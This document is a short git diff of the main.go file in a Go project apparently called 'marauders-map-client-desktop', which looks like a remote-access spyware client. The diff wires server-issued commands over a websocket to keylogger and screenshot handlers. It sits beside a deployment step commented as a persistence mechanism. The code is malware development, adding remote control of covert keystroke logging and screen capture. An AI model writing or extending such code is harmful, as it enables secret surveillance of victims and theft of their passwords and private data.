@@ -3,6 +3,7 @@ package main
 import (
 	"marauders-map-client-desktop/internal/deploy"
 	"marauders-map-client-desktop/internal/wsclient"
+	"marauders-map-client-desktop/internal/wsclient/observer"
 )
 
 func main() {
@@ -12,6 +13,7 @@ func main() {
 	// folder strcuture & persist mechanism
 	deploy.Deploy()
 
+	// TODO: delete this
 	// ch := make(chan *screen.Screenshot)
 	// recorder := screen.NewScreenRecorder(5)
 	// recorder.StartCapturing(ch)
@@ -23,7 +25,15 @@ func main() {
 	// 	log.Println("Shot path:", shot.FilePath)
 	// }
 
+	// Observer for processing incoming
+	// commands from server
+	subject := &observer.Subject{}
+	subject.AddListener(&observer.KeyloggerCmdObserver{})
+	subject.AddListener(&observer.ScreenshotCmdObserver{})
+
 	// Start connection and communication with server
-	wsclient.StartCommunications()
+	// Subject with Observers is passed as parameter
+	// for processing commands
+	wsclient.StartCommunications(subject)
 
 }
